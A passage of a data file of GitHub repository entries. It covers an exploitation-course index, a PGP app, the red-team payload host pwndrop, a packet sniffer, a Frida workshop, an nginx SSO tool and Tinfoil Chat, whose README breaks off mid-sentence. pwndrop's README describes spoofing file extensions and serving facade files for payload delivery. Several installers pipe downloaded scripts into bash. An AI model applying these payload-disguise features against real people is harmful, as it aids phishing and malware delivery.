csaw13_bikinibonanza\\n- whitehat18_re06\\n\\n#### 22.) Movfuscation \\n- sawmpctf19_future \\n- asis18quals_babyc \\n- other_movfuscated\\n\\n#### 23.) Custom Architectures\\n- h3_challenge0 \\n- h3_challenge1\\n- h3_challenge2\\n- h3_challenge3\\n\\n## Heap Pt 0 rip Angel Beats\\n\\n#### 24.) Basic Heap overflow\\n- protostar_heap1\\n- protostar_heap0\\n- protostar_heap2\\n\\n#### 25.) Intro to heap exploitation / binning \\n- explanation\\n\\n#### 26.) Heap Grooming \\n- explanation \\n- swamp19_heapgolf\\n- pico_areyouroot \\n\\n#### 27.) Edit Freed Chunk (pure explanation) \\n- Use After Free \\n- Double Free \\n- Null Byte Heap Consolidation\\n\\n#### 28.) Fastbin Attack \\n- explanation \\n- 0ctf18_babyheap\\n- csaw17_auir \\n\\n#### 29.) tcache \\n- explanation\\n- dcquals19_babyheap\\n- plaid19_cpp \\n\\n#### 30.) unlink \\n- explanation\\n- hitcon14_stkof \\n- zctf16_note \\n\\n#### 31.) Unsorted Bin Attack \\n- explanation\\n- hitcon_magicheap \\n- 0ctf16_zer0storage \\n\\n#### 32.) Large Bin Attack \\n- largebin0_explanation\\n- largebin1_explanation\\n\\n#### 33.) Custom Malloc \\n- csawquals17_minesweeper \\n- csawquals18_AliensVSSamurai\\n- csawquals19_traveller\\n\\n## General Pt 2 Generic Isekai #367\\n\\n#### 34.) Qemu / Emulated Targets \\n- csaw18_tour_of_x86_pt_2 \\n- csaw15_hackingtime \\n- csaw17_realism\\n\\n#### 35.) Integer Exploitation \\n- puzzle\\n- int_overflow_post\\n- signed_unsigned_int_expl\\n\\n#### 36.) Obfuscated Reversing \\n- csaw15_wyvern \\n- csaw17_prophecy\\n- bkp16_unholy\\n\\n#### 37.) FS Exploitation \\n- swamp19_badfile\\n\\n#### 38.) Grab Bag \\n- csaw18_doubletrouble\\n- hackim19_shop \\n- unit_vars_expl\\n- csaw19_gibberish\\n\\n## Heap pt 1 heap x heap\\n\\n#### 39.) House of Spirit \\n- explanation\\n- hacklu14_oreo\\n\\n#### 40.) House of Lore \\n- explanation\\n\\n#### 41.) House of Force \\n- explanation\\n- bkp16_cookbook\\n\\n#### 42.) House of Einherjar \\n- explanation\\n\\n#### 43.) House of Orange \\n- explanation\\n\\n#### 44.) More tcache\\n- csaw19_poppingCaps0\\n- csaw19_poppingCaps1\\n\\n#### 45.) Automatic Exploit Generation\\n- csaw20_rop\\n\\n#### Ending Documentation\\n- References\\n- What's next\\n\\n\\n\"", "topics": [], "writeup": "", "ignoredescription": false, "id": 21, "full_name": "guyinatuxedo/nightmare", "url": "https://github.com/guyinatuxedo/nightmare"},
{"tags": [], "owner": "henryboldi", "description": "\ud83d\udd11\ud83d\udd25\ud83d\udcc8 Next Level PGP", "name": "felony", "topics_string": "electron encrypted-messages encryption pgp react", "language": "JavaScript", "readme": "\"![Felony Logo](https://i.imgur.com/gqG7XoQ.png)\\n![Felony Screenshot](https://i.imgur.com/0e1ZOLp.png)\\n\\n**Felony is an open-source pgp keychain built on the modern web with Electron, React, and Redux.** Felony is the first PGP app that's easy for anyone to use, without a tutorial.\\n\\n[![Github All Releases](https://img.shields.io/github/downloads/henryboldi/felony/total.svg?maxAge=2592000)]()\\n\\n[![FOSSA Status](https://app.fossa.io/api/projects/git%2Bhttps%3A%2F%2Fgithub.com%2Fhenryboldi%2Ffelony.svg?size=large)](https://app.fossa.io/projects/git%2Bhttps%3A%2F%2Fgithub.com%2Fhenryboldi%2Ffelony?ref=badge_large)\\n\\n## Download Felony\\nYou can download compiled versions of Felony for Windows, macOS, and Linux from https://github.com/henryboldi/felony/releases. The app is currently in its pre-release stage, so it hasn't been fully tested on all platforms. Confirmed to be working on Mac, as that's what the developers own.\\n\\n## How it works\\n### 1. Add public keys to your buddies list\\nA public key is like a username - Adding someone\\u2019s public key to your buddies list lets you send them messages. You can find other public keys on markets like Keybase.io and Darknet.\\n### 2. Encrypt a message\\nSelect a recipient from your buddies list and compose a message. Only your chosen recipient(s) can read the message. Encrypted messages can be used to send sensitive information, such as an address, document, or anything intended to be read only by intended recipients.\\n### 3. Send the encrypted message anywhere\\nYou can send the encrypted message on any website! Send encrypted messages over Facebook Messenger, Twitter DMs, YouTube, Instagram, or anywhere else. **Felony is security when and where you want it.**\\n\\n## Running Locally\\nTo run the development environment run\\n```\\nnpm run dev\\n```\\nTo package felony run\\n```\\nnpm run package\\n```\\nTo build for all platforms\\n```\\nnpm run package-all\\n```\\nFor more information check out [electron-react-boilerplate](https://github.com/chentsulin/electron-react-boilerplate), which we used as a starting point.\\n\\n## Feature Requests\\nHave an idea for a feature you'd love to see in Felony? Create an issue and tag it as a feature request.\\n\\n## Maintainers\\n\\nMaintained with \\u2764\\ufe0f by [Sanil](https://github.com/TechyPeople), [Frank](https://github.com/frankcash).\\n\\nCreated by [Henry](https://github.com/henryboldi) & [Case](https://github.com/casesandberg).\\n\\n> 100% inline styles via [ReactCSS](http://reactcss.com/)\\n\"", "topics": ["electron", "encrypted-messages", "encryption", "pgp", "react"], "writeup": "", "ignoredescription": false, "id": 22, "full_name": "henryboldi/felony", "url": "https://github.com/henryboldi/felony"},
{"tags": [], "owner": "kgretzky", "description": "Self-deployable file hosting service for red teamers, allowing to easily upload and share payloads over HTTP and WebDAV.", "name": "pwndrop", "topics_string": "file-manager file-sharing http-server payloads redteam self-hosted webdav-server", "language": "JavaScript", "readme": "\"<p align=\\\"center\\\">\\n <img alt=\\\"pwndrop logo\\\" src=\\\"https://raw.githubusercontent.com/kgretzky/pwndrop/master/media/pwndrop-logo-512.png\\\" height=\\\"120\\\" />\\n <p align=\\\"center\\\">\\n <img alt=\\\"pwndrop title\\\" src=\\\"https://raw.githubusercontent.com/kgretzky/pwndrop/master/media/pwndrop-title-black-512.png\\\" height=\\\"40\\\" />\\n </p>\\n</p>\\n\\n**pwndrop** is a self-deployable file hosting service for sending out red teaming payloads or securely sharing your private files over HTTP and WebDAV.\\n\\nIf you've ever needed to quickly set up an nginx/apache web server to host your files and you were never happy with the limitations of `python -m SimpleHTTPServer`, **pwndrop** is definitely for you!\\n\\n<p align=\\\"center\\\">\\n <img alt=\\\"demo\\\" src=\\\"https://raw.githubusercontent.com/kgretzky/pwndrop/master/media/demo1.gif\\\" height=\\\"500\\\" />\\n</p>\\n\\nWith **pwndrop** you can:\\n- [x] Upload and immediately share multiple files using your own private VPS, using drag & drop.\\n- [x] Decide to make files available or unavailable for download with a single click.\\n- [x] Set up custom download URLs, for shared files, without playing with directory structure.\\n- [x] Set up facade files, which will be served instead of the original file whenever you feel like it.\\n- [x] Set up automatic redirects to spoof the file's extension in a shared link.\\n- [x] Change MIME type of the served file to change browser's behavior when a download link is clicked.\\n- [x] Serve files over HTTP, HTTPS and WebDAV.\\n- [x] Install and setup everything using a bash oneliner.\\n- [x] Set up **pwndrop** to work as a nameserver and respond with a valid DNS A record to any sub-domain you choose.\\n- [x] Protect your admin panel behind a custom secret URL path and log in securely with your own username and password.\\n- [x] Never worry about setting up HTTPS certificates as **pwndrop** does everything for you in the background (including auto-renewals).\\n\\nIts main goal is to make file sharing as easy and intuitive as possible, while implementing extra features to aid in red team assessments.\\n\\nFrontend of **pwndrop** is developed in pure Vue.js + Bootstrap with no npm or webpack dependencies. The backend serves REST API and manages a local database, powered by GO language.\\n\\n## Write-up\\n\\nIf you want to learn how to use **pwndrop** or you want to learn what new features were implemented in recent releases, make sure to check out the posts on my blog:\\n\\nhttps://breakdev.org/pwndrop\\n\\n## Video guide\\n\\nTake a look at the fantastic video made by Luke Turvey ([@TurvSec](https://twitter.com/TurvSec)), which fully explains how to get started using **pwndrop**.\\n\\n[![File and Phishing Payload Hosting using PwnDrop (Red Team) - Luke Turvey](https://img.youtube.com/vi/e3veSyIFvOE/0.jpg)](https://www.youtube.com/watch?v=e3veSyIFvOE)\\n\\n## Prerequisites\\n\\nIf you don't yet have the server to deploy to I highly recommend Digital Ocean. The cheapest $5/mo Debian 9 server with 25GB of storage space will work wonders for you. You can use my referral link to [get an extra $100 to spend on your servers in 60 days for free](https://m.do.co/c/50338abc7ffe).\\n\\nRegister a new domain and point its DNS A records to your VPS IP. You can also register a domain and point its `ns1` and `ns2` nameservers to **pwndrop** instance IP - it will automatically respond with valid DNS A replies.\\n\\n1. Registered domain name pointing to **pwndrop** instance IP as a DNS A records or as a nameserver.\\n2. Server with at least 512 MB RAM.\\n\\nIf you want to set up **pwndrop** without a domain, check below how to set up a local instance, which will not auto-generate HTTPS certificates.\\n\\n## Installation\\n\\nMake sure there aren't any DNS or HTTP(S) servers running before you attempt to install **pwndrop**.\\n\\n#### Oneliner\\n\\nI do not recommend running oneliners, before downloading and checking the script code, but if you are really in a hurry, here it is:\\n```\\ncurl https://raw.githubusercontent.com/kgretzky/pwndrop/master/install_linux.sh | sudo bash\\n```\\n\\nThis will download the latest amd64 release binary and fully install a daemon running in a background.\\n\\n#### From binary\\n\\nFirst you need to download the release package you want from: https://github.com/kgretzky/pwndrop/releases\\n\\nThen do the following (this performs same actions to the oneliner):\\n\\n```\\ntar zxvf pwndrop-linux-amd64.tar.gz\\n./pwndrop stop\\n./pwndrop install\\n./pwndrop start\\n./pwndrop status\\n```\\n\\n#### From source code\\n\\nFirst of all, make sure you have installed GO with version at least **1.13**: https://golang.org/doc/install\\n\\nThen do the following:\\n\\n```\\ngit clone https://github.com/kgretzky/pwndrop\\ncd pwndrop\\nmake\\nmake install\\n```\\n\\n## Quickstart\\n\\nMake sure the **pwndrop** is running.\\n\\n1. Open the secret URL to authorize your browser: `https://yourdomain.com/pwndrop` (this is a default value; make sure to use the secret path, you've pre-configured)\\n2. Open the admin panel URL in your browser: `https://yourdomain.com/` (since you've authorized your browser, you will now see an admin panel login page)\\n3. Create your admin account or login.\\n4. Click the configuration cog in top-left corner and make sure you change the secret path to something other than `/pwndrop`.\\n\\nYou're good to go!\\n\\n## Running from CLI\\n\\nYou don't have to install **pwndrop** as a daemon and you can run it straight from the console.\\n\\n```\\nusage: pwndrop [start|stop|install|remove|status] [-config <config_path>] [-debug] [-no-autocert] [-no-dns] [-h]\\n\\ndaemon management:\\n start : start the daemon\\n stop : stop the daemon\\n install : install the daemon using the available system manager (systemd, systemv and upstart supported)\\n remove : uninstall the daemon\\n status : check status of the installed daemon\\n\\nparameters:\\n -config : specify a custom path to a config file (def. 'pwndrop.ini' in same directory as the executable)\\n -debug : enable debug output \\n -no-autocert : disable automatic TLS certificate retrieval from LetsEncrypt; useful when you want to connect over IP or/and in a local network\\n -no-dns : do not run a DNS server on port 53 UDP; use this if you don't want to use pwndrop as a nameserver\\n -h : usage help\\n```\\n\\n## Configuration\\n\\nOn first launch, **pwndrop**, by default, will create a new configuration file `pwndrop.ini` in the same directory as an executable. You can later modify it or supply your own, for example to pre-configure **pwndrop** before the installation to automate the deployment of a tool even better.\\n\\nHere is an example config file with all available config variables with commentary:\\n```\\n[pwndrop]\\nlisten_ip = \\\"190.33.86.22\\\" # the external IP of your pwndrop instance (must be set if you want to use the nameserver feature)\\nhttp_port = 80 # listening port for HTTP and WebDAV\\nhttps_port = 443 # listening port for HTTPS\\ndata_dir = \\\"./data\\\" # directory path where data storage will reside (relative paths are from executable directory path)\\nadmin_dir = \\\"./admin\\\" # directory path where the admin panel files reside (relative paths are from executable directory path)\\n\\n[setup] # optional: put in if you want to pre-configure pwndrop (section will be deleted from the config file on first run)\\nusername = \\\"admin\\\" # username of the admin account\\npassword = \\\"secretpassword\\\" # password of the admin account\\nredirect_url = \\\"https://www.somedomain.com\\\" # URL to which visitors will be redirected to if they supply a path, which doesn't point to any shared file (put blank if you want to return 404)\\nsecret_path = \\\"/pwndrop\\\" # secret URL path, which upon visiting will allow your browser to access the login page of the admin panel (make sure to change the default value)\\n```\\n\\nIf you want to pre-configure your **pwndrop** instance before deployment using any of the installation scripts, put your configuration file at `/usr/local/pwndrop/pwndrop.ini` and it will be parsed the moment **pwndrop** daemon is first executed.\\n\\n## Credits\\n\\nHuge thanks to [**@jaredhaight**](https://twitter.com/jaredhaight) for inspiring me to learn Vue, with his [Faction C2](https://www.factionc2.com/) framework!\\n\\nAlso much thanks to all the people who gave me pre-release feedback and supported me with their opinions on the tool!\\n\\n## License\\n\\n**pwndrop** is made by Kuba Gretzky ([@mrgretzky](https://twitter.com/mrgretzky)) and it's released under GPL3 license.\\n\"", "topics": ["file-manager", "file-sharing", "http-server", "payloads", "redteam", "self-hosted", "webdav-server"], "writeup": "", "ignoredescription": false, "id": 23, "full_name": "kgretzky/pwndrop", "url": "https://github.com/kgretzky/pwndrop"},
{"tags": [], "owner": "kpcyrd", "description": "Secure multithreaded packet sniffer", "name": "sniffglue", "topics_string": "network pcap rust sandboxed sniffer", "language": "Rust", "readme": "\"# sniffglue [![Build Status][travis-img]][travis] [![Crates.io][crates-img]][crates]\\n\\n[travis-img]: https://travis-ci.org/kpcyrd/sniffglue.svg?branch=master\\n[travis]: https://travis-ci.org/kpcyrd/sniffglue\\n[crates-img]: https://img.shields.io/crates/v/sniffglue.svg\\n[crates]: https://crates.io/crates/sniffglue\\n\\nsniffglue is a network sniffer written in rust. Network packets are parsed concurrently\\nusing a thread pool to utilize all cpu cores. Project goals are that you can\\nrun sniffglue securely on untrusted networks and that it must not crash\\nwhen processing packets. The output should be as useful as possible by default.\\n\\n![screenshot](docs/screenshot.png)\\n\\n## Usage\\n\\n # sniff with default filters (dhcp, dns, tls, http)\\n sniffglue enp0s25\\n # increase the filter sensitivity (arp)\\n sniffglue -v enp0s25\\n # increase the filter sensitivity (cjdns, ssdp, dropbox, packets with valid utf8)\\n sniffglue -vv enp0s25\\n # almost everything\\n sniffglue -vvv enp0s25\\n # everything\\n sniffglue -vvvv enp0s25\\n\\n## Installation\\n\\n### Arch Linux\\n\\n pacman -S sniffglue\\n\\n### Mac OSX\\n\\n brew install sniffglue\\n\\n### Debian/Ubuntu/Kali\\n\\nThere are prebuilt packages signed by a debian maintainer. We can import the\\nkey for this repository out of the debian keyring.\\n\\n apt install debian-keyring\\n gpg -a --export --keyring /usr/share/keyrings/debian-maintainers.gpg git@rxv.cc | apt-key add -\\n apt-key adv --keyserver keyserver.ubuntu.com --refresh-keys git@rxv.cc\\n echo deb http://apt.vulns.sexy stable main > /etc/apt/sources.list.d/apt-vulns-sexy.list\\n apt update\\n apt install sniffglue\\n\\n### Alpine\\n\\n apk add sniffglue\\n\\n### Gentoo\\n\\n layman -a pentoo\\n emerge --ask net-analyzer/sniffglue\\n\\n### NixOS\\n\\n nix-env -i sniffglue\\n\\n### From source\\n\\nTo build from source make sure you have libpcap and libseccomp installed. On\\ndebian based systems:\\n\\n # install the dependencies\\n sudo apt install libpcap-dev libseccomp-dev\\n # install rust with rustup\\n curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh\\n source $HOME/.cargo/env\\n # install sniffglue and test it\\n cargo install sniffglue\\n sniffglue --help\\n\\nOr you can build a Debian package via [cargo-deb](https://github.com/mmstick/cargo-deb):\\n\\n cargo deb\\n\\n## Protocols\\n\\n- [X] ethernet\\n- [X] ipv4\\n- [X] ipv6\\n- [X] arp\\n- [X] tcp\\n- [X] udp\\n- [ ] icmp\\n- [X] http\\n- [X] tls\\n- [X] dns\\n- [X] dhcp\\n- [X] cjdns eth beacons\\n- [X] ssdp\\n- [X] dropbox beacons\\n- [ ] 802.11\\n\\n## Docker\\n\\nYou can build sniffglue as a docker image to debug container setups. The image\\nis currently about 11.1MB. It is recommended to push it to your own registry.\\n\\n docker build -t sniffglue .\\n docker run -it --init --rm --net=host sniffglue eth0\\n\\n## Security\\n\\nTo report a security issue please contact kpcyrd on ircs://irc.hackint.org.\\n\\n### Seccomp\\n\\nTo ensure a compromised process doesn't compromise the system, sniffglue uses\\nseccomp to restrict the syscalls that can be used after the process started.\\nThis is done in two stages, first at the very beginning (directly after\\nenv\\\\_logger initialized) and once after the sniffer has been setup, but before\\npackets are read from the network.\\n\\n### Hardening\\n\\nDuring the second stage, there's also some general hardening that is applied\\nbefore all unneeded syscalls are finally disabled. Those are system specific,\\nso a configuration file is read from `/etc/sniffglue.conf`. This config\\nfile specifies an empty directory for `chroot` and an unprivileged account\\nin `user` that is used to drop root privileges.\\n\\n### boxxy-rs\\n\\nThis project includes a small [boxxy-rs] based shell that can be used to\\nexplore the sandbox at various stages during and after initialization. This is\\nalso used by travis to ensure the sandbox actually blocks syscalls.\\n\\n cargo run --example boxxy\\n\\n[boxxy-rs]: https://github.com/kpcyrd/boxxy-rs\\n\\n### Reproducible builds\\n\\nThis project is tested using reprotest. Currently the following variations are\\nexcluded:\\n\\n- `-time` - needed because the crates.io cert expires in the future\\n- `-domain_host` - requires root for unshare(2) and has been excluded\\n\\nDon't forget to install the build dependencies.\\n\\n ci/reprotest.sh\\n\\n### Fuzzing\\n\\nThe packet processing of sniffglue can be fuzzed using [cargo-fuzz].\\nEverything you should need is provided in the `fuzz/` directory that is\\ndistributed along with its source code. Please note that this program links\\nto libpcap which is not included in the current fuzzing configuration.\\n\\n cargo fuzz run read_packet\\n\\n[cargo-fuzz]: https://github.com/rust-fuzz/cargo-fuzz\\n\\n## License\\n\\nGPLv3+\\n\"", "topics": ["network", "pcap", "rust", "sandboxed", "sniffer"], "writeup": "sniffglue is a network sniffer written in rust. Network packets are parsed concurrently using a thread pool to utilize all cpu cores. Project goals are that you can run sniffglue securely on untrusted networks and that it must not crash when processing packets. The output should be as useful as possible by default.", "ignoredescription": false, "id": 24, "full_name": "kpcyrd/sniffglue", "url": "https://github.com/kpcyrd/sniffglue"},
{"tags": ["education", "course"], "owner": "leonjza", "description": "Frida Boot \ud83d\udc62- A binary instrumentation workshop, with Frida, for beginners!", "name": "frida-boot", "topics_string": "beginner frida instrumentation training workshop education course", "language": "CSS", "readme": "\"\\n<h1 align=\\\"center\\\">\\n <br>\\n <br>\\n frida-boot \\ud83d\\udc62\\n <br>\\n</h1>\\n\\n<h4 align=\\\"center\\\">\\n A binary instrumentation workshop, using <a href=\\\"https://frida.re\\\" target=\\\"_blank\\\">Frida</a>, for beginners!\\n <br />\\n <p align=\\\"center\\\">\\n <a href=\\\"https://twitter.com/leonjza\\\"><img src=\\\"https://img.shields.io/badge/twitter-%40leonjza-blue.svg\\\" alt=\\\"@leonjza\\\" height=\\\"18\\\"></a>\\n <a href=\\\"https://hub.docker.com/r/leonjza/frida-boot\\\"><img alt=\\\"Docker Cloud Build Status\\\" src=\\\"https://img.shields.io/docker/cloud/build/leonjza/frida-boot\\\"></a>\\n </p>\\n </h4>\\n\\n## quickstart\\n\\n<img align=\\\"right\\\" src=\\\"./images/frida-boot-web.png\\\" height=\\\"320\\\" alt=\\\"frida-boot\\\">\\n\\n- `git clone https://github.com/leonjza/frida-boot`\\n- `cd frida-boot`\\n- `./docker.sh pull`\\n- `./docker.sh run`\\n\\nAfter running the container, all of the offline workshop content will be available at <http://localhost:9999>.\\n\\n## slides & stream\\n\\nThis workshop was streamed on YouTube [here](https://www.youtube.com/watch?v=CLpW1tZCblo).\\n\\nThe slides for the workshop can be found on Google Slides [here](https://docs.google.com/presentation/d/1BK4CsGChSKI8BCVsg9Rlv0lY5AfsrbanhIRWnKaP0TI/edit?usp=sharing), with a PDF copy available in the `slides/` directory of this repository.\\n\\n## manually building\\n\\nThe `Dockerfile` in this repository can be used to manually build the container. Feel free to edit it to suit your needs.\\n\\n```bash\\ndocker build -t frida-boot:local .\\n```\\n\"", "topics": ["beginner", "frida", "instrumentation", "training", "workshop"], "writeup": "", "ignoredescription": false, "id": 25, "full_name": "leonjza/frida-boot", "url": "https://github.com/leonjza/frida-boot"},
{"tags": [], "owner": "Luzifer", "description": "SSO authentication provider for the auth_request nginx module", "name": "nginx-sso", "topics_string": "atlassian-crowd duo golang google-authenticator ldap mfa nginx oauth2 oidc openid-connect sso totp yubikey", "language": "Go", "readme": "\"[![Go Report Card](https://goreportcard.com/badge/github.com/Luzifer/nginx-sso)](https://goreportcard.com/report/github.com/Luzifer/nginx-sso)\\n![](https://badges.fyi/github/license/Luzifer/nginx-sso)\\n![](https://badges.fyi/github/downloads/Luzifer/nginx-sso)\\n![](https://badges.fyi/github/latest-release/Luzifer/nginx-sso)\\n\\n# Luzifer / nginx-sso\\n\\nThis program is intended to be used within the [`ngx_http_auth_request_module`](https://nginx.org/en/docs/http/ngx_http_auth_request_module.html) of nginx to provide a single-sign-on for a domain using one central authentication directory.\\n\\n## Documentation\\n\\nIn order to increase readability of the documentation it has been moved to the [Github project Wiki](https://github.com/Luzifer/nginx-sso/wiki). You can find everything previously documented in the README there.\\n\"", "topics": ["atlassian-crowd", "duo", "golang", "google-authenticator", "ldap", "mfa", "nginx", "oauth2", "oidc", "openid-connect", "sso", "totp", "yubikey"], "writeup": "nginx-sso is intended to be used within the ngx_http_auth_request_module of Nginx to provide a single-sign-on (SSO) for a domain using one central authentication directory.", "ignoredescription": false, "id": 26, "full_name": "Luzifer/nginx-sso", "url": "https://github.com/Luzifer/nginx-sso"},
{"tags": [], "owner": "maqp", "description": "Tinfoil Chat - Onion-routed, endpoint secure messaging system", "name": "tfc", "topics_string": "data-diode end-to-end-encryption endpoint-security hidden-services onion-service onion-services open-source privacy-by-design python3 qubes-os secure-by-default secure-messenger tails tor tor-onion-service", "language": "Python", "readme": "\"<img align=\\\"right\\\" src=\\\"https://cs.helsinki.fi/u/oottela/tfc_logo.png\\\" style=\\\"position: relative; top: 0; left: 0;\\\">\\n\\n### Tinfoil Chat\\n\\n[![License: GPL v3](https://img.shields.io/badge/License-GPLv3-blue.svg)](https://www.gnu.org/licenses/gpl-3.0)\\n[![Python 3.7|3.8](https://img.shields.io/badge/python-3.7%20%7C%C2%A03.8-blue)](https://img.shields.io/badge/python-3.7%20%7C%C2%A03.8-blue)\\n[![Checked with mypy](http://www.mypy-lang.org/static/mypy_badge.svg)](http://mypy-lang.org/)\\n[![Build Status](https://travis-ci.org/maqp/tfc.svg?branch=master)](https://travis-ci.org/maqp/tfc) \\n[![Coverage Status](https://coveralls.io/repos/github/maqp/tfc/badge.svg?branch=master)](https://coveralls.io/github/maqp/tfc?branch=master)\\n[![Codacy Badge](https://api.codacy.com/project/badge/Grade/71fa9cc1da424f52a576a04c2722da26)](https://www.codacy.com/manual/maqp/tfc?utm_source=github.com&amp;utm_medium=referral&amp;utm_content=maqp/tfc&amp;utm_campaign=Badge_Grade)\\n[![CodeFactor](https://www.codefactor.io/repository/github/maqp/tfc/badge)](https://www.codefactor.io/repository/github/maqp/tfc)\\n[![Requirements Status](https://requires.io/github/maqp/tfc/requirements.svg?branch=master)](https://requires.io/github/maqp/tfc/requirements/?branch=master)\\n[![Snyk Report](https://snyk.io/test/github/maqp/tfc/badge.svg)](https://snyk.io/test/github/maqp/tfc)\\n\\nTinfoil Chat (TFC) is a\\n[FOSS](https://www.gnu.org/philosophy/free-sw.html)+[FHD](https://www.gnu.org/philosophy/free-hardware-designs.en.html)\\n[peer-to-peer](https://en.wikipedia.org/wiki/Peer-to-peer)\\nmessaging system that relies on high assurance hardware architecture to protect users from\\n[passive collection](https://en.wikipedia.org/wiki/Upstream_collection), \\n[MITM attacks](https://en.wikipedia.org/wiki/Man-in-the-middle_attack)\\nand most importantly,\\n[remote key exfiltration](https://en.wikipedia.org/wiki/Data_exfiltration). \\nTFC is designed for people with one of the most complex threat models: organized crime \\ngroups and nation state hackers who bypass end-to-end encryption of traditional secure \\nmessaging apps by hacking the endpoint.\\n\\n\\n#### State-of-the-art cryptography\\n\\nTFC uses\\n[XChaCha20](https://cr.yp.to/chacha/chacha-20080128.pdf)-[Poly1305](https://cr.yp.to/mac/poly1305-20050329.pdf)\\n[end-to-end encryption](https://en.wikipedia.org/wiki/End-to-end_encryption)\\nwith\\n[deniable authentication](https://en.wikipedia.org/wiki/Deniable_encryption#Deniable_authentication)\\nto protect all messages and files sent to individual recipients and groups. \\nThe symmetric keys are either\\n[pre-shared](https://en.wikipedia.org/wiki/Pre-shared_key),\\nor exchanged using\\n[X448](https://eprint.iacr.org/2015/625.pdf),\\nthe base-10\\n[fingerprints](https://en.wikipedia.org/wiki/Public_key_fingerprint)\\nof which are verified via an out-of-band channel. TFC provides per-message\\n[forward secrecy](https://en.wikipedia.org/wiki/Forward_secrecy)\\nwith\\n[BLAKE2b](https://blake2.net/blake2.pdf) \\nbased\\n[hash ratchet](https://www.youtube.com/watch?v=9sO2qdTci-s#t=1m34s).\\nAll persistent user data is encrypted locally using XChaCha20-Poly1305, the key \\nof which is derived from password and salt using \\n[Argon2id](https://github.com/P-H-C/phc-winner-argon2/blob/master/argon2-specs.pdf),\\nthe parameters of which are automatically tuned according to best \\npractices. Key generation of TFC relies on Linux kernel's \\n[getrandom()](https://manpages.debian.org/testing/manpages-dev/getrandom.2.en.html),\\na syscall for its ChaCha20 based \\n[CSPRNG](https://en.wikipedia.org/wiki/Cryptographically_secure_pseudorandom_number_generator).\\n\\n\\n#### Anonymous by design\\nTFC routes all communication exclusively through the \\n[Tor](https://2019.www.torproject.org/about/overview.html.en) \\nanonymity network. It uses the next generation\\n([v3](https://trac.torproject.org/projects/tor/wiki/doc/NextGenOnions))\\n[Tor Onion Services](https://2019.www.torproject.org/docs/onion-services)\\nto enable P2P communication that never exits the Tor network. This makes it hard for the \\nusers to accidentally deanonymize themselves. It also means that unlike (de)centralized \\nmessengers, there's no third party server with access to user metadata such as who is \\ntalking to whom, when, and how much. The network architecture means TFC runs exclusively \\non the user's devices. There are no ads or tracking, and it collects no data whatsoever \\nabout the user. All data is always encrypted with keys the user controls, and the \\ndatabases never leave the user's device.\\n\\nUsing Onion Services also means no account registration is needed. During the first launch \\nTFC generates a random TFC account (an Onion Service address) for the user, e.g.\\n`4sci35xrhp2d45gbm3qpta7ogfedonuw2mucmc36jxemucd7fmgzj3ad`. By knowing this TFC account, \\nanyone can send the user a contact request and talk to them without ever learning their \\nreal life identity, IP-address, or geolocation. Protected geolocation makes physical \\nattacks very difficult because the attacker doesn't know where the device is located on \\nthe planet. At the same time it makes the communication censorship resistant: Blocking TFC \\nrequires blocking Tor categorically, nation-wide.\\n\\nTFC also features a traffic masking mode that hides the type, quantity, and schedule of \\ncommunication, even if the network facing device of the user is hacked. To provide even\\nfurther metadata protection from hackers, the Internet-facing part of TFC can be run on \\n[Tails](https://tails.boum.org/), a privacy and anonymity focused operating system that \\ncontains no personal files of the user (which makes it hard to deduce to whom the endpoint\\nbelongs to), and that provides \\n[additional layers of protection](https://github.com/Whonix/onion-grater)\\nfor their anonymity.\\n\\n\\n#### First messaging system with endpoint security\\n\\nTFC is designed to be used in hardware configuration that provides strong\\n[endpoint security](https://en.wikipedia.org/wiki/Endpoint_security).\\nThis configuration uses three computers per endpoint: Encryption and decryption processes\\nare separated from each other onto two isolated computers, the Source Computer, and the \\nDestination Computer. These two devices are are dedicated for TFC. This split \\n[TCB](https://en.wikipedia.org/wiki/Trusted_computing_base)\\ninteracts with the network via the user's daily computer, called the Networked Computer.\\n\\nIn TFC data moves from the Source Computer to the Networked Computer, and from the Networked \\nComputer to the Destination Computer, unidirectionally. The unidirectionality of data\\nflow is enforced, as the data is passed from one device to another only through a free \\nhardware design\\n[data diode](https://en.wikipedia.org/wiki/Unidirectional_network), \\nthat is connected to the three computers using one USB-cable per device.\\nThe Source and Destination Computers are not connected to the Internet, or to any device \\nother than the data diode.\\n\\n\\n![](https://www.cs.helsinki.fi/u/oottela/wiki/readme/data_diode.jpg)\\n[TFC data diode](https://www.cs.helsinki.fi/u/oottela/wiki/readme/data_diode.jpg)\\n\\nOptical repeater inside the\\n[optocouplers](https://en.wikipedia.org/wiki/Opto-isolator)\\nof the data diode enforce direction of data transmission with the fundamental laws of \\nphysics. This protection is so strong, the certified implementations of data diodes are \\ntypically found in critical infrastructure protection and government networks where the\\nclassification level of data varies between systems. A data diode might e.g. allow access \\nto a nuclear power plant's safety system readings, while at the same time preventing \\nattackers from exploiting these critical systems. An alternative use case is to allow \\nimporting data from less secure systems to ones that contain classified documents that \\nmust be protected from exfiltration.\\n\\nIn TFC the hardware data diode ensures that neither of the TCB-halves can be accessed \\nbidirectionally. Since the protection relies on physical limitations of the hardware's\\ncapabilities, no piece of malware, not even a \\n[zero-day exploit](https://en.wikipedia.org/wiki/Zero-day_(computing))\\ncan bypass the security provided by the data diode.\\n\\n\\n### How it works\\n\\nWith the hardware in place, all that's left for the users to do is launch the device \\nspecific TFC program on each computer.\\n\\n![](https://www.cs.helsinki.fi/u/oottela/wiki/readme/overview.png)\\n[System overview](https://www.cs.helsinki.fi/u/oottela/wiki/readme/overview.png)\\n\\nIn the illustration above, Alice enters messages and commands to Transmitter Program \\nrunning on her Source Computer. The Transmitter Program encrypts and signs plaintext \\ndata and relays the ciphertexts from Source Computer to her Networked Computer \\nthrough the data diode.\\n\\nRelay Program on Alice's Networked Computer relays commands and copies of outgoing \\nmessages to her Destination Computer via the data diode. Receiver Program on Alice's \\nDestination Computer authenticates, decrypts and processes the received message/command.\\n\\nAlice's Relay Program shares messages and files to Bob over a Tor Onion Service. \\nThe web client of Bob's Relay Program fetches the ciphertext from Alice's Onion \\nService and forwards it to his Destination Computer through his data diode. Bob's \\nReceiver Program then authenticates, decrypts and processes the received message/file.\\n\\nWhen Bob responds, he will type his message to the Transmitter Program on his Source \\nComputer, and after a mirrored process, Alice reads the message from the Receiver Program\\non her Destination Computer.\\n\\n\\n### Why keys and plaintexts cannot be exfiltrated\\n\\nThe architecture described above simultaneously utilizes both\\n[the classical and the alternative data diode models](https://en.wikipedia.org/wiki/Unidirectional_network#Applications) \\nto enable bidirectional communication between two users, while at the same time providing \\nhardware enforced endpoint security: \\n\\n1. The Destination Computer uses the classical data diode model. This means 